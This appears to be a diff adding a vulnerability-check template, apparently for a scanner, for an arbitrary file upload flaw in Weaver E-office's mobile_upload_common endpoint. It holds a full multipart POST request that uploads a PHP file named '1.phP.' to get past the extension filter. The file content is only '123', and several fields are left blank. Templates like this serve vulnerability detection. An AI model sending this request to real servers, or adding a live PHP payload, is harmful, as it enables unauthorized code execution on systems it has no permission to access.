@@ -1,0 +1,34 @@
+id:
+
+info:
+  name: 泛微E-office mobile_upload_common任意文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /e-mobile/app/Ajax/ajax.php?action=mobile_upload_common
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+    Connection: keep-alive
+    Content-Length: 334
+  data: |
+    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+    Content-Disposition: form-data; name="upload_quwan"; filename="1.phP."
+    Content-Type: image/jpeg
+    
+    123
+    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+    Content-Disposition: form-data; name="file"; filename=""
+    Content-Type: application/octet-stream
+    
+    
+    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
+response1:
+  headers:
+  body: attachment
+  code:
+requests2:
+response2:
